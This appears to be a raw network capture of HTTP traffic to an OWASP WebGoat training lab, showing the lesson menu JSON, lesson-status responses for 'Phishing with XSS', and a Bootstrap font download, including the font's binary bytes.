+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+69.
+{"lessonCompleted":true,"successMessage":"Congratulations. You have successfully completed this lesson."}.
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58715 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+69.
+{"lessonCompleted":true,"successMessage":"Congratulations. You have successfully completed this lesson."}.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41081 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+2000.
+[{"name":"Introduction","type":"CATEGORY","children":[{"name":"How to work with WebGoat","type":"LESSON","children":[],"complete":true,"link":"#attack/360466308/5"},{"name":"How to create a Legacy Lesson","type":"LESSON","children":[],"complete":false,"link":"#attack/1894705151/5"}],"complete":false,"link":null},{"name":"General","type":"CATEGORY","children":[{"name":"Http Basics","type":"LESSON","children":[],"complete":false,"link":"#attack/1869022003/100"}],"complete":false,"link":null},{"name":"Access Control Flaws","type":"CATEGORY","children":[{"name":"Using an Access Control Matrix","type":"LESSON","children":[],"complete":false,"link":"#attack/1708534694/200"},{"name":"Bypass a Path Based Access Control Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/231255157/200"},{"name":"LAB: Role Based Access Control","type":"LESSON","children":[{"name":"Stage 1: Bypass Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/1"},{"name":"Stage 2: Add Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/2"},{"name":"Stage 3: Bypass Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/3"},{"name":"Stage 4: Add Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/4"}],"complete":false,"link":"#attack/160587164/200"}],"complete":false,"link":null},{"name":"AJAX Security","type":"CATEGORY","children":[{"name":"DOM Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/76122667/400"},{"name":"LAB: DOM-Based cross-site scripting","type":"LESSON","children":[],"complete":false,"link":"#attack/2022121558/400"},{"name":"LAB: Client Side Filtering","type":"LESSON","children":[],"complete":false,"link":"#attack/330535848/400"},{"name":"XML Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/2000980640/400"},{"name":"JSON Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1426618575/400"},{"name":"Silent Transactions Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/218322538/400"},{"name":"Insecure Client Storage","type":"LESSON","children":[],"complete":false,"link":"#attack/1129417221/400"},{"name":"Dangerous Use of Eval","type":"LESSON","children":[],"complete":false,"link":"#attack/136634854/400"},{"name":"Same Origin Policy Protection","type":"LESSON","children":[],"complete":false,"link":"#attack/1750680855/400"}],"complete":false,"link":null},{"name":"Authentication Flaws","type":"CATEGORY","children":[{"name":"Password Strength","type":"LESSON","children":[],"complete":false,"link":"#attack/1778575388/500"},{"name":"Forgot Password","type":"LESSON","children":[],"complete":false,"link":"#attack/372049154/500"},{"name":"Multi Level Login 1","type":"LESSON","children":[],"complete":false,"link":"#attack/810720179/500"},{"name":"Multi Level Login 2","type":"LESSON","children":[],"complete":false,"link":"#attack/810720180/500"}],"complete":false,"link":null},{"name":"Buffer Overflows","type":"CATEGORY","children":[{"name":"Off-by-One Overflows","type":"LESSON","children":[],"complete":false,"link":"#attack/736032128/600"}],"complete":false,"link":null},{"name":"Code Quality","type":"CATEGORY","children":[{"name":"Discover Clues in the HTML","type":"LESSON","children":[],"complete":false,"link":"#attack/125644239/700"}],"complete":false,"link":null},{"name":"Concurrency","type":"CATEGORY","children":[{"name":"Thread Safety Problems","type":"LESSON","children":[],"complete":false,"link":"#attack/339531107/800"},{"name":"Shopping Cart Concurrency Flaw","type":"LESSON","children":[],"complete":false,"link":"#attack/734491955/800"}],"complete":false,"link":null},{"name":"Cross-Site Scripting (XSS)","type":"CATEGORY","children":[{"name":"Phishing with XSS","type":"LESSON","children":[],"complete":true,"link":"#attack/1382523204/900"},{"name":"Stored XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/598569451/900"},{"name":"LAB: Cross Site Scripting","type":"LESSON","children":[{"name":"Stage 1: Stored XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/1"},{"name":"Stage 2: Block Stored XSS using Input Validation","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/2"},{"name":"Stage 3: Stored XSS Revisited","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/3"},{"name":"Stage 4: Block Stored XSS using Output Encoding","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/4"},{"name":"Stage 5: Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/5"},{"name":"Stage 6: Block Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/6"}],"complete":false,"link":"#attack/611366032/900"},{"name":"Reflected XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/1406352188/900"},{"name":"Cross Site Request Forgery (CSRF)","type":"LESSON","children":[],"complete":false,"link":"#attack/2078372/900"},{"name":"CSRF Prompt By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/1471017872/900"},{"name":"CSRF Token By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/803158781/900"},{"name":"HTTPOnly Test","type":"LESSON","children":[],"complete":false,"link":"#attack/68584332/900"}],"complete":false,"link":null},{"name":"Improper Error Handling","type":"CATEGORY","children":[{"name":"Fail Open Authentication Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/1075773632/1000"}],"complete":false,"link":null},{"name":"Injection Flaws","type":"CATEGORY","children":[{"name":"Command Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1922448916/1100"},{"name":"Numeric SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/101829144/1100"},{"name":"Log Spoofing","type":"LESSON","children":[],"complete":false,"link":"#attack/1572295549/1100"},{"name":"XPATH Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/882451674/1100"},{"name":"LAB: SQL Injection","type":"LESSON","children":[{"name":"Stage 1: String SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/1"},{"name":"Stage 2: Parameterized Query #1","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/2"},{"name":"Stage 3: Numeric SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/3"},{"name":"Stage 4: Parameterized Query #2","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/4"}],"complete":false,"link":"#attack/1537271095/1100"},{"name":"String SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/538385464/1100"},{"name":"Database Backdoors ","type":"LESSON","children":[],"complete":false,"link":"#attack/980912706/1100"},{"name":"Blind Numeric SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/586116895/1100"},{"name":"Blind String SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1315528047/1100"}],"complete":false,"link":null},{"name":"Denial of Service","type":"CATEGORY","children":[{"name":"ZipBomb","type":"LESSON","children":[],"complete":false,"link":"#attack/1382524227/1200"},{"name":"Denial of Service from Multiple Logins","type":"LESSON","children":[],"complete":false,"link":"#attack/1036971378/1200"}],"complete":false,"link":null},{"name":"Insecure Communication","type":"CATEGORY","children":[{"name":"Insecure Login","type":"LESSON","children":[],"complete":false,"link":"#attack/1525997619/1300"}],"complete":false,"link":null},{"name":"Insecure Storage","type":"CATEGORY","children":[{"name":"Encoding Basics","type":"LESSON","children":[],"complete":false,"link":"#attack/1786050421/1500"}],"complete":false,"link":null},{"name":"Malicious Execution","type":"CATEGORY","children":[{"name":"Malicious File Execution","type":"LESSON","children":[],"complete":false.
+82d.
+,"link":"#attack/2027530490/1600"}],"complete":false,"link":null},{"name":"Parameter Tampering","type":"CATEGORY","children":[{"name":"Bypass HTML Field Restrictions","type":"LESSON","children":[],"complete":false
+
+T 192.168.0.100:80 -> 192.168.33.1:58712 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+1eec.
+[{"name":"Introduction","type":"CATEGORY","children":[{"name":"How to work with WebGoat","type":"LESSON","children":[],"complete":true,"link":"#attack/360466308/5"},{"name":"How to create a Legacy Lesson","type":"LESSON","children":[],"complete":false,"link":"#attack/1894705151/5"}],"complete":false,"link":null},{"name":"General","type":"CATEGORY","children":[{"name":"Http Basics","type":"LESSON","children":[],"complete":false,"link":"#attack/1869022003/100"}],"complete":false,"link":null},{"name":"Access Control Flaws","type":"CATEGORY","children":[{"name":"Using an Access Control Matrix","type":"LESSON","children":[],"complete":false,"link":"#attack/1708534694/200"},{"name":"Bypass a Path Based Access Control Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/231255157/200"},{"name":"LAB: Role Based Access Control","type":"LESSON","children":[{"name":"Stage 1: Bypass Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/1"},{"name":"Stage 2: Add Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/2"},{"name":"Stage 3: Bypass Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/3"},{"name":"Stage 4: Add Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/4"}],"complete":false,"link":"#attack/160587164/200"}],"complete":false,"link":null},{"name":"AJAX Security","type":"CATEGORY","children":[{"name":"DOM Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/76122667/400"},{"name":"LAB: DOM-Based cross-site scripting","type":"LESSON","children":[],"complete":false,"link":"#attack/2022121558/400"},{"name":"LAB: Client Side Filtering","type":"LESSON","children":[],"complete":false,"link":"#attack/330535848/400"},{"name":"XML Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/2000980640/400"},{"name":"JSON Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1426618575/400"},{"name":"Silent Transactions Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/218322538/400"},{"name":"Insecure Client Storage","type":"LESSON","children":[],"complete":false,"link":"#attack/1129417221/400"},{"name":"Dangerous Use of Eval","type":"LESSON","children":[],"complete":false,"link":"#attack/136634854/400"},{"name":"Same Origin Policy Protection","type":"LESSON","children":[],"complete":false,"link":"#attack/1750680855/400"}],"complete":false,"link":null},{"name":"Authentication Flaws","type":"CATEGORY","children":[{"name":"Password Strength","type":"LESSON","children":[],"complete":false,"link":"#attack/1778575388/500"},{"name":"Forgot Password","type":"LESSON","children":[],"complete":false,"link":"#attack/372049154/500"},{"name":"Multi Level Login 1","type":"LESSON","children":[],"complete":false,"link":"#attack/810720179/500"},{"name":"Multi Level Login 2","type":"LESSON","children":[],"complete":false,"link":"#attack/810720180/500"}],"complete":false,"link":null},{"name":"Buffer Overflows","type":"CATEGORY","children":[{"name":"Off-by-One Overflows","type":"LESSON","children":[],"complete":false,"link":"#attack/736032128/600"}],"complete":false,"link":null},{"name":"Code Quality","type":"CATEGORY","children":[{"name":"Discover Clues in the HTML","type":"LESSON","children":[],"complete":false,"link":"#attack/125644239/700"}],"complete":false,"link":null},{"name":"Concurrency","type":"CATEGORY","children":[{"name":"Thread Safety Problems","type":"LESSON","children":[],"complete":false,"link":"#attack/339531107/800"},{"name":"Shopping Cart Concurrency Flaw","type":"LESSON","children":[],"complete":false,"link":"#attack/734491955/800"}],"complete":false,"link":null},{"name":"Cross-Site Scripting (XSS)","type":"CATEGORY","children":[{"name":"Phishing with XSS","type":"LESSON","children":[],"complete":true,"link":"#attack/1382523204/900"},{"name":"Stored XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/598569451/900"},{"name":"LAB: Cross Site Scripting","type":"LESSON","children":[{"name":"Stage 1: Stored XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/1"},{"name":"Stage 2: Block Stored XSS using Input Validation","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/2"},{"name":"Stage 3: Stored XSS Revisited","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/3"},{"name":"Stage 4: Block Stored XSS using Output Encoding","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/4"},{"name":"Stage 5: Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/5"},{"name":"Stage 6: Block Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/6"}],"complete":false,"link":"#attack/611366032/900"},{"name":"Reflected XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/1406352188/900"},{"name":"Cross Site Request Forgery (CSRF)","type":"LESSON","children":[],"complete":false,"link":"#attack/2078372/900"},{"name":"CSRF Prompt By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/1471017872/900"},{"name":"CSRF Token By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/803158781/900"},{"name":"HTTPOnly Test","type":"LESSON","children":[],"complete":false,"link":"#attack/68584332/900"}],"complete":false,"link":null},{"name":"Improper Error Handling","type":"CATEGORY","children":[{"name":"Fail Open Authentication Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/1075773632/1000"}],"complete":false,"link":null},{"name":"Injection Flaws","type":"CATEGORY","children":[{"name":"Command Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1922448916/1100"},{"name":"Numeric SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/101829144/1100"},{"name":"Log Spoofing","type":"LESSON","children":[],"complete":false,"link":"#attack/1572295549/1100"},{"name":"XPATH Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/882451674/1100"},{"name":"LAB: SQL Injection","type":"LESSON","children":[{"name":"Stage 1: String SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/1"},{"name":"Stage 2: Parameterized Query #1","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/2"},{"name":"Stage 3: Numeric SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/3"},{"name":"Stage 4: Parameterized Query #2","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/4"}],"complete":false,"link":"#attack/1537271095/1100"},{"name":"String SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/538385464/1100"},{"n
+
+T 192.168.0.10:8080 -> 192.168.0.100:41075 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+7b.
+{"lessonTitle":"Phishing with XSS","numberHints":7,"hasSource":true,"hasSolution":true,"hasPlan":true,"submitMethod":"GET"}.
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58713 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+7b.
+{"lessonTitle":"Phishing with XSS","numberHints":7,"hasSource":true,"hasSolution":true,"hasPlan":true,"submitMethod":"GET"}.
+
+
+T 192.168.33.1:58713 -> 192.168.0.100:80 [AP]
+GET /WebGoat/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: identity.
+Referer: http://webgoat.cyexc-target/WebGoat/plugins/bootstrap/css/bootstrap.min.css.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41083 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: identity.
+Referer: http://webgoat.cyexc-target/WebGoat/plugins/bootstrap/css/bootstrap.min.css.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41083 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Accept-Ranges: bytes.
+ETag: W/"23292-1479487864000".
+Last-Modified: Fri, 18 Nov 2016 16:51:04 GMT.
+Content-Type: application/x-font-woff.
+Content-Length: 23292.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+wOFF......Z.................................FFTM............h...GDEF........... ....OS/2.......C...`g.K.cmap...........j.HL.cvt .............(..fpgm... .......eS./.gasp................glyf......M.....*...head..R....4...6..k.hhea..S........$
+2..hmtx..S ............loca..T4........2.Tzmaxp..U.... ... ....name..V........|....post..W....>.....A.Vprep..Z...........+.webf..Z.........a.R7.........=.......].......].}x.c`d``..b...`b`..[@...1........x.c`fid........t...!
+B3.a0b.......P.p?....G.......I0......(00...a...x...=K.A..g.\.Dc.
+..3X...i...&....*A$...V.K....;....&Wx....Jml.5..WYX..|-3..,..).-2...p.Y...t..B....U...{Y.....Ne.T......@k...F....u.S..PC.Gh!B.C.q..g..{....x...zZV....v.s..H'0(CPG.&..b..&..x.~...mO..y..\>...Yi.K .R..)
+.'.......o.....].p.g|..|..v.../e...59.r....R.<..*f...3..u#eH......(..x.]Q.N[A........ 9......{......bd;...i7r..q..@.D.......H..!.H|B>!.3k..4;;.s..3K...w.k.S.$.....6.NH............Zlf..u.......;j..=o)..M;.Z.....
+.....;..4...:..!...qK...........b00.....?.R..4.j.......3...4@Skm....!..q.K....6....$....tUS.....]...`.*.....Vy....&...$.,...b......
+9.....@.H...IJ;.........6O..<.Mmo...Y..w..K:......b;b)..DBFU.....,..R..@...........D<..u.1V.z~......V...Bwo.j..)..^........Ac.....J..<,.4h..Cz7z........>.'...Z...........x.........<..H.....H..Ve%m...j....W....t...)...0.L.$....1....PG..I..%$pJQ...p..4..r..J.w...}........^K.&.{.{..^....8.|F.p.'q...2.eI........,.<lr%....pY2
+G...........62G....."G.l........e.2N.Z9..h..F..5K4.F....Y.]..l)@:..=.|4UP..\P...U.....T.H..v.P........I..Qz....?z_+..+[8..o.....e.Y:..!...h..f9..Y.\..l.l.Sf..Y..q...;Kv
+].D....!]dD......7....A...,W..pZ6..U.mY........p.d5CFk.i....jJF.V.../T\....V.....PK.>].n....Z..9..~.Y..d.&.k.r......#....B...+....O....x..KQ)jT.-,...|>g...X*MR.......'.~v........-..........A#.......rJh....-.7=Q..u....f..'N.........x.N.....K......X.....~5..V...BF.e.../7...J41S2....V.[.nCr...c....%.....p....U.._Q3%?|.d.dw......#x}.h./.....4....Wu...+...>...tW...~.5~.)..UW<}..g........c.'......"..[8;...Z ..l.Q....."].A~=..F........wx.1.4.F.F.....><.....".sF..qR........!..d'....C.....:.n.....o.......)..v;W.....:?k.....W6"?KUM.id.h.C@..`B.....&.7MF`\+%..%2L.|T.5....@Zm.....E>....L0_..".....0...9)9.Z..MJ..Q..Ql......s..\...X.p..2..8`.......;.3w...K.^.Wh..'...-V....2.R..8..z.]......k.6pe.b..hjUkb.....!M.j..e.f.9...Pd.>.w.[.~. ..s%....._Se...5...N2...=n. .x%..:.1."......s%#*i.Vk^A.$.........../..w...O..s..+w].....H..Z._........?a......s.N....h.!.Q...&....|....+^. ....S.......m....y...wx..[..'..lY.-....D.{..9...xC..S.7.x....7.E..0....,...<Q.1..P8.......5}.=....{....*....&..=...I...7|.... ~....cS
+&R..{T...
+..4.>....;.[..w......Uw...;.....g..w=..y..%.Ho_.."^c\!
+.I...G.. #w.R.?W..i.*......9.......d...;*pM...R\'....qe.9H......RF..4SUk.j....i........#...ZWV.d.tN.V..Y.?..!9..K.Q..3.\.V5....Q..vY.].Uk.w.......km....".R..L.w...P-.QP.. ..M...S.5.P`...2..Oz...Y.%.............K_....../AY
+.....#..ck..h..fss.........d..6HI...1...E.G?..J.@...^.ffK'P.........0..X2@&..O8...PB!E..........6../i..}.xg8...q_...].....k5.Bi......[."%J.......W.~w.t..`..Z:..,Pg..Sr!.......B3@R.Y.........U:..m.../...~..-.C).sa....IbI9...$....!...;.............<.....`.....1^[..A...t./.i.Um>..v:..v2....FT=...6N?z^.....$.....q4.....2....'S.?.;...}..F....SP.ex.........`qH.T.<*d..~.'...t...~..].]$.......
+f...d&.....A.$...[..>.'...k`.......&h....sZ..E.....9.I.xB...j....?.5..I.X....j.l9..K.q.V2...f.VbL.h..N..Q.} .........h..+..u.n.:\...h..8...sMr.. ....{. .sJN.+....!..........."..u.}....;c:.*2U...4..Q.j.}.n.<.V..O...X..b.u.8f.5..k...F.U..U&..."..q...Q].S..A.h..~...#..]t]..e..s..s..*..#O.l..A..Qh2.l....o...T3s...f..,.........K..M`.w..V.......s.l..._....w_.}..uH)..(....i.~.P.Z:r...Rx|X...-p.\Ll.k...E..\*..13...+........D....*.1.Y.:.jI.....6....W.....C_!h.....-oP.V!..\..K..-.N.....VU........R...v..............*.!`...>...GVhu...0,K...K.(0.Ry..M-..}.R.....o..k!.O-.>..eg.}...WH..`3.....RH..T.6.1'ot..QR%#l.P)T..X2h|.w..U.....{...XS&iLg.....J.;..../..*......=...0d.....W..;...\.........IcO.....IB.N......pR..m....rsw...0.6+s..p..w...2.n3d.........o...d......5....q.......8.Z.......".)wd.r..4UA.D.....3.XY.y.<..N....y...P3-'.......\(......J=....z..=[....z=pQ...L.....N.\D.V.....j'.BV....MOm.....@;.j. ...a..-..(.2.>:.}.He....6".Z.....v.^..p.....}p..?0:.?...G..&...........+....|.......&.g#...K....B'....N.~......?~.......(G....(...9..d....X.$.. ..... ..&...6..N:F."...J...8.G..:...+ n.:t......F.Q...(>->.s..<..C..Y..(d...o.*0...rj...v.5W...._...T.Nn..h4..v.S.....U.U.1.N.u....{.gw.)..2..V......v.b..]..........|...G._?........C..E 2..xb...,.......$=Hm...C.g..MQ^.kV..C...rf...I....,.r.&..$'...
+q....E....G.?#.....A[..MO..:T>ZE.......ttv.%\...dw...d.EeY...".D...h...$. .x3H*....z....~J...^.O..(?.7`.7.=G.x B..W).8...}..@.ra......s....B.V.j2[HA.lv.....1.K.,...E.Ju.fY..k.{.........Xs....k+j.0...t)".......Y{.8..........?.@.z....#...|.....x^....v"....u...hS.."&`......1....|.EL....kp...G1.8....Q=hz...`"......#Gv..+.s...I.1....r.5...Z2. _a"....)....[..........s......BN.V..?..v;..J%K.............0..[....[6.Q.......t.P:.........6 .h..>..T....S....$.......C2..O&......Sp.NrO....75sk8t5....-.p.(....U.0~...... z.j...,.....2.>..^...d......D.{......RT.`Uw...(.:......]z/...+..V...]..m.u.............Qx]\...+.8.0.|....../....s.l7..;.n..sPT5.c.`...d\....~....`..~.E......h.Z`..R.a....Hgn;.. G.I.$.rT.e./..y.....-.|..}.}.o/.YLF...v._....xv....O.I.q...k|;./k...2.?.b....Ds..-.E......R.n.....R3.t.lsyQ..V.....Pi........06R./.,.C$.$....F.-G..;.P.......y.....{.c..2.u"..*.]..9.0b.`T.. ....u.............T..R.W6.a....~..q.9..Q.......lYM.Vo....m...$..k._.>PY.e..
+(1{.<..]T......$.\V..F4..&.,.FB...a...IAv..`......n...b{.u...~..^.....a.6.V.D......fYp...LV=.\....]..3H.....j}t.C@..5{.W......u.JY...j.......y...N....j..$...).<^.......u..%3L"a.......W<2sM A.5......R.......t..G.x..G...L{L6.....&...V.u......7....U....U......z/.7l.dyE\/...@o...A6DI.c&*X.)0u.....;...........C...6..rrn..
+.C(..Z ..=Q.;CJ.........h.Z.........}..yo}..-.#.7...7HcW.)..~..C.&xZ`t<f...OeK<.P.sx.?.H4!'....RR.xV.h.......r.t...I..F.............[...yO...w_.e.k*....i.G..T.....g..%..y`.-.V..8.4c>.$.j..g...`...\...r.{9..eJ....A)...%......z...s...%C...............U.<..Jik..A..s..4...c..2.:...W....."l.TK.%..*-.J..j+.....(.N..f.`e.*.@.lT....]nk....R..(.....j\.....o.v.1.|......y..=Q9.G.K..E.:...^..E.U.<...+.... ......@\...."...&#..n.....(<..U....]....x...5...B.......)....^T..VQx.....x3^..Z....|..7.....d3......G..#%...cT{m..C.e@.b..j.:!.)V.5h..a...&...WQH.\.......&..4..1.4#.<)...+.|*...}.>E.2..T*.....-.....i.M.I.5..o..{R...J..*30..\?....g.R....xf.yU_....J.$.V......^....C..C./.'.{6.w'.............}. ...........;3............. .C.*.....Kv?x..E<.%/!DV.$.4...4...a..^....k.....Y&....=......w.h.4.....@........G.E.}.<w...W....=]+Kp?...{.....
+y...R......}.....{..<..T.l6p............Z.I..`.`A.Q..3.,2...F$..5Yq.s.b.....Z<L....-!M.2I(....Z.....P......o.W....,.....M...9l..I.j..k....:.R...m.9....n......[-~...B\......f'..k.h...e`".L..,Z.....l..v-.R............K.)@).........Zbq....\J..0...[...........2-.b...4..C.......l_o2...@..6*F.Dg......zV.j..ZRq.22R1....^O.:x.*L....N.Q...`
+.5#$....Iu.<....&...q.=...e....h.L........M.*....'Si..\....q..Q=yrI.p..tr.jWg.|-.......g....m.N'.TN_5.....7....K:<i.]x..{F.-(I........x..?..9..0*.q..B...OB.....d....FGI<...B..%..k@.....Y.(%.0J>...(l4.k.2.j=.....49"-......H.E.$.T.f.t.r.RS@?.........V.1...........m...3........ ....f5dwJ../..(..$..;a....Y^.x..7..[.z#...eT...F...-...F.Q4.R............I..OU*..4=ci[d4......X.`..2cQ.4/#.4..C...o...6.....4.s...k>!3..v.....2o..Bc...Q.w..[...T@2...M.)........A....8~..i........|)Y@....fkib.....@.......s.G.Ea.F...*.ZA.STP..]z...:..?.+.R..X..o.Vb..W.u..'....p.....b..>.-...j...Bt.....x7.>.....-...R...]...d.Z.}z$C....Mf.
+...V..1*.x......Zd..A*.g.@R.@...A=.....P.f.QO+....2.O.P.....w.Q..
+4.R.....'].>.~H......~|."....l.M..4z..F/....K
+..T>v.o.U.......a....7.:..9<..o...4.&k.F.+.3...e0.c(..V1...k1D&..=.O...I.......L.........6...;..x1..v.....c........"s>a.Q2M.W..#.k.-....i...4..d.[p1.-(f..m9..\.b.F......,.4(..f..s..*+d.....-.....C?..9......GG>........... .........z.f....K3h`2... ...)Jc`.^.MH.8...?.f.....8s`.w..~p|...:.(
+..D9...e....
+;.gD...4..<.W..s..kiF.sH.W....)..q...G..h...'D..'*..U....:....K.Kk.!Mx.zs.i."L1..<T.....k.....\I.....j..b.VKW..~KWW....K...t..'.......x..y..e7.f7,..0.....s.U..R..`6E(.....".<n...de.GA.D..y..&..&....QwM......@...^w....c.I.{.....+Vl.....A.Q.......".......<.....c.......4....!.{..........UM
+...".!.U......K*.&^....T.y..../^..k...5...}..%v..Wv.~...6=...]...........W.........,...z..f..ck
+.x<..e.5_Cd.....gM......F.J^.(J.A.6~..c..f.?.
+
+T 192.168.0.100:80 -> 192.168.33.1:58713 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/x-font-woff.
+Content-Length: 23292.
+Connection: keep-alive.
+Accept-Ranges: bytes.
+ETag: W/"23292-1479487864000".
+Last-Modified: Fri, 18 Nov 2016 16:51:04 GMT.
+.
+wOFF......Z.................................FFTM............h...GDEF........... ....OS/2.......C...`g.K.cmap...........j.HL.cvt .............(..fpgm... .......eS./.gasp................glyf......M.....*...head..R....4...6..k.hhea..S........$
+2..hmtx..S ............loca..T4........2.Tzmaxp..U.... ... ....name..V........|....post..W....>.....A.Vprep..Z...........+.webf..Z.........a.R7.........=.......].......].}x.c`d``..b...`b`..[@...1........x.c`fid........t...!
+B3.a0b.......P.p?....G.......I0......(00...a...x...=K.A..g.\.Dc.
